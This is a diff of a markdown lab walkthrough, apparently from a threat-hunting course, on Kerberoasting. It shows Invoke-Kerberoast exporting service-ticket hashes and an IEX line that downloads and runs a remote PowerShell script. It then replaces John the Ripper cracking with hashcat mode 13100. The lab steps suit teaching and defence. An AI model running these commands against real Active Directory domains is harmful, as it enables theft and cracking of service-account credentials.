@@ -120,7 +120,7 @@ IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com
 ```
 
 ```yaml
-Invoke-Kerberoast | Select-Object -ExpandProperty hash | out-file -Encoding ASCII kerb-Hash.txt
+Invoke-Kerberoast -OutputFormat hashcat | % { $_.Hash } | Out-File -Encoding ASCII hashes.kerberoast
 ```
 ![image](./images/02_IEX_KERB.jpg)
 
@@ -134,14 +134,7 @@ invoke-kerberoast -Identity SVC_sql
 
 > Invoke-Kerberoast's default output is for **John** (the password cracker installed by default on Kali), you can ofcourse change the output format to **HashCat** as well if you prefer working with that.
 
-On your `Windows 10 machine` Open a command prompt:
-
-We're going to start a little python webserver in the `directory` where we save the kerb-hash.txt file. Replace xx with the IP ADDRESS of your windows machine. 
-
-```code
-cd c:\labs\4_KERBEROAST
-python -m http.server -b 10.0.0.xx 9090
-```
+On your `Windows 10 machine` use WinSCP to transfer ***hashes.kerberoast*** to your Ubuntu machine under the path ***"/opt/kerberos/"*** :
 
 > **IMPORTANT**: If you want to run this attack multiple times, don't forget to purge your Kerberos tickets. Kerberos Tickets are cached for SSO purposes, so if you run the Invoke-Kerberoast script multplie times, your client will not request a new TGS from the DC when it still has one in it's cach.
 >
@@ -158,32 +151,21 @@ klist purge
 
 ![image](./images/00_klist_purge.jpg)
 
-# CRACKING HASHES USING JOHN THE RIPPER
+# CRACKING HASHES USING HASHCAT
 ---
 
-On your `Kali Machine`, download the requested 
+On your `Ubuntu Machine` we're going to use hashcat to crack the hashes
 
-```code
-cd /opt  
-wget http://10.0.0.xxx:9090/kerb-hash.txt
-```
-> **xxx** = the IP address of your Windows Machine.
+First let's install hashcat
 
-```code
-john kerb-hash.txt --wordlist=/opt/threathunt/labs/4_KERBEROAST/Top1000.txt 
+```yaml
+apt get update
+apt install hashcat
 ```
 
-
-![image](./assets/03_john.jpg)
-
-``` cd /opt
-john --show kerb-hash.txt
+```yaml
+cd /opt/kerberos
+hashcat -m 13100 --force -a 0 hashes.kerberoast passwords.txt
 ```
 
-![image](./assets/03_john2.jpg)
-
-# BONUS : USING HASHCAT
----
-
-> HashCat is a more powerful and common password cracking tool, in the steps below we'll show how to install HasChat on ubuntu and use it to crack Kerberos tickets.
 
